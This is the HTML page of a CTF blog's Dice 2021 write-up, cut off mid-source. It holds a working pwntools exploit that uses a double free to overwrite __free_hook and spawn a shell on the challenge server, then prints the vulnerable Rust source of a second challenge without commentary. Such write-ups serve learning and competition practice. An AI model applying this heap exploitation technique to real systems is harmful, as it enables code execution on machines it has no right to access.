@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Dice 2021 CTF | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="Easy123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*-import sysfrom past.builtins import xrangefrom pwn import *HOST,PORT &#x3D; &quot;dicec.tf&quot;, 31904p &#x3D; remote(HOST, P">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dice 2021 CTF">
+<meta property="og:url" content="http://example.com/2021/02/16/2021dicectf/index.html">
+<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
+<meta property="og:description" content="Easy123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*-import sysfrom past.builtins import xrangefrom pwn import *HOST,PORT &#x3D; &quot;dicec.tf&quot;, 31904p &#x3D; remote(HOST, P">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://tacqiniu.jagger2zr.com/image-20210213231052659.png">
+<meta property="article:published_time" content="2021-02-16T03:07:10.000Z">
+<meta property="article:modified_time" content="2025-11-18T07:44:18.213Z">
+<meta property="article:author" content="xrivendell7">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://tacqiniu.jagger2zr.com/image-20210213231052659.png">
+  
+    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-2021dicectf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/16/2021dicectf/" class="article-date">
+  <time class="dt-published" datetime="2021-02-16T03:07:10.000Z" itemprop="datePublished">2021-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Dice 2021 CTF
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="Easy"><a href="#Easy" class="headerlink" title="Easy"></a>Easy</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> past.builtins <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31904</span></span><br><span class="line">p = remote(HOST, PORT)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./flippidy&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, cnt</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>, cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;be: &#x27;</span>, <span class="built_in">str</span>(<span class="number">13</span>))</span><br><span class="line">add(<span class="number">6</span>, p64(<span class="number">0x404020</span>)+p64(<span class="number">0</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flip() <span class="comment"># double free</span></span><br><span class="line">add(<span class="number">6</span>, p64(<span class="number">0x403F88</span>)+p64(<span class="number">0x404072</span>)+p64(<span class="number">0x4040a4</span>)+p64(<span class="number">0x4040d6</span>)+p64(<span class="number">0x404040</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n\n&#x27;</span>)</span><br><span class="line">free = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;@ free: &quot;</span>+<span class="built_in">hex</span>(free))</span><br><span class="line">l = free-<span class="number">0x97950</span></span><br><span class="line">log.info(<span class="string">&quot;@ l: &quot;</span>+<span class="built_in">hex</span>(l))</span><br><span class="line">add(<span class="number">6</span>, p64(l+<span class="number">0x3ed8e8</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, p64(l+<span class="number">0x04f440</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">flip()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># dice&#123;some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Soucelessrustwasm"><a href="#Soucelessrustwasm" class="headerlink" title="Soucelessrustwasm"></a>Soucelessrustwasm</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::io;</span><br><span class="line"><span class="keyword">use</span> std::process;</span><br><span class="line"><span class="keyword">use</span> std::io::Write;</span><br><span class="line"><span class="keyword">use</span> std::io::Read;</span><br><span class="line"><span class="keyword">use</span> std::fs;</span><br><span class="line"><span class="keyword">use</span> std::ptr;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> <span class="title class_">Sword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> ();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">RustySword</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Sword</span> <span class="keyword">for</span> <span class="title class_">RustySword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">read_file</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> () &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Name: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.name);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Description: &#123;&#125;&quot;</span>, <span class="title function_ invoke__">read_file</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">NewSword</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    desc: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Sword</span> <span class="keyword">for</span> <span class="title class_">NewSword</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">inspect</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You inspect your handiwork.&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You admire its blade, and note something interesting.&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">desc</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">            .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> desc)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">        <span class="keyword">self</span>.desc = desc;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>.desc.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">display</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> () &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Name: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.name);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Description: &#123;&#125;&quot;</span>, <span class="keyword">self</span>.desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">menu</span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;1. Forge a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;2. Scrap a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;3. Inspect a weapon&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;4. View stock&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;5. View log&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;6. Exit&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">forge</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], c: &amp;<span class="keyword">mut</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = (*c).<span class="title function_ invoke__">into</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;What&#x27;s the name of your new weapon?&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">new_name</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> new_name)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_weapon</span>: <span class="type">Box</span>&lt;NewSword&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(NewSword &#123;</span><br><span class="line">        name: new_name,</span><br><span class="line">        desc: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;None&quot;</span>)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    stock[index] = <span class="type">Box</span>::<span class="title function_ invoke__">into_raw</span>(new_weapon) <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">    *c += <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">scrap</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], c: &amp;<span class="keyword">mut</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = (*c).<span class="title function_ invoke__">into</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> index &gt; <span class="number">10</span> &#123;</span><br><span class="line">        <span class="comment">// index-1 &gt;= 10</span></span><br><span class="line">        stock[index-<span class="number">1</span>] = ptr::null_mut::&lt;NewSword&gt;();</span><br><span class="line">        *c -= <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;You feel yourself unable to scrap these legendary artifacts, rusty though they may be.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">inspect</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword], log: &amp;<span class="keyword">mut</span> [<span class="type">u8</span>]) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Which weapon do you want to inspect?&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    <span class="title function_ invoke__">prompt</span>();</span><br><span class="line">    io::<span class="title function_ invoke__">stdin</span>()</span><br><span class="line">        .<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> index)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;failed to read input.&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">index</span>: <span class="type">usize</span> = index.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>().<span class="title function_ invoke__">expect</span>(<span class="string">&quot;invalid input&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> !stock[index].<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">log_s</span>: <span class="type">String</span>;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">weapon</span>: *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword = stock[index];</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                log_s = (*weapon).<span class="title function_ invoke__">inspect</span>();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> index &gt;= <span class="number">10</span> &amp;&amp; log_s.<span class="title function_ invoke__">len</span>() &gt; <span class="number">256</span> &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Error: too big!&quot;</span>);</span><br><span class="line">                process::<span class="title function_ invoke__">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">unsafe</span> &#123;</span><br><span class="line">                ptr::<span class="title function_ invoke__">copy_nonoverlapping</span>(log_s.<span class="title function_ invoke__">as_ptr</span>(), log.<span class="title function_ invoke__">as_mut_ptr</span>(), log_s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">            &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">view_stock</span>&lt;<span class="symbol">&#x27;a</span>&gt;(stock: &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]) <span class="punctuation">-&gt;</span> &amp;<span class="symbol">&#x27;a</span> <span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]  &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">index</span>: <span class="type">usize</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> !stock[index].<span class="title function_ invoke__">is_null</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">weapon</span>: *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword = stock[index] <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">        <span class="keyword">unsafe</span> &#123;</span><br><span class="line">            (*weapon).<span class="title function_ invoke__">display</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        index += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">view_log</span>(log: &amp;<span class="keyword">mut</span> [<span class="type">u8</span>]) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You recall the weapon you saw last.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, <span class="type">str</span>::<span class="title function_ invoke__">from_utf8</span>(log).<span class="title function_ invoke__">unwrap</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">prompt</span>() &#123;</span><br><span class="line">    <span class="built_in">print!</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">    io::<span class="title function_ invoke__">stdout</span>().<span class="title function_ invoke__">flush</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">read_file</span>() <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">src_file</span>: &amp;<span class="type">str</span> = <span class="string">&quot;excalibur.txt&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">src_file_handle</span>: fs::File = fs::File::<span class="title function_ invoke__">open</span>(&amp;src_file).<span class="title function_ invoke__">expect</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Could not open file: &#123;&#125;&quot;</span>, &amp;src_file));</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">buf</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">    src_file_handle.<span class="title function_ invoke__">read_to_string</span>(&amp;<span class="keyword">mut</span> buf)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(&amp;<span class="built_in">format!</span>(<span class="string">&quot;Failed to read data from file: &#123;&#125;&quot;</span>, &amp;src_file));</span><br><span class="line">    <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">init_stock</span>(stock: &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword]) <span class="punctuation">-&gt;</span> &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword] &#123;</span><br><span class="line">    <span class="keyword">for</span> <span class="variable">i</span> <span class="keyword">in</span> <span class="number">0</span>..<span class="number">10</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">new_weapon</span>: <span class="type">Box</span>&lt;RustySword&gt; = <span class="type">Box</span>::<span class="title function_ invoke__">new</span>(RustySword &#123;</span><br><span class="line">            name: <span class="built_in">format!</span>(<span class="string">&quot;Excalibur &#123;&#125;&quot;</span>, i+<span class="number">1</span>),</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        stock[i] = <span class="type">Box</span>::<span class="title function_ invoke__">into_raw</span>(new_weapon) <span class="keyword">as</span> *<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stock</span>: [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword; <span class="number">256</span>] = [ptr::null_mut::&lt;NewSword&gt;(); <span class="number">256</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">c</span>: <span class="type">u8</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">stock_ptr</span>: &amp;<span class="keyword">mut</span> [*<span class="keyword">mut</span> <span class="keyword">dyn</span> Sword] = &amp;<span class="keyword">mut</span> stock;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">input_buf</span>: [<span class="type">u8</span>; <span class="number">2</span>] =  [<span class="number">0</span>; <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">log</span>: [<span class="type">u8</span>; <span class="number">256</span>] = [<span class="number">0</span>; <span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    stock_ptr = <span class="title function_ invoke__">init_stock</span>(stock_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;You are a blacksmith who has recently been exiled from your home. You leave, reluctant to part with your bustling shop with all your hard-forged equipment.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;As you travel across distant lands, you stumble upon a town. In it, you find an abandoned armory. Though all the equipment is rusted over, you decide to rennovate it and reestablish your bustling blacksmithing empire.&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;This is your story of how you went from a 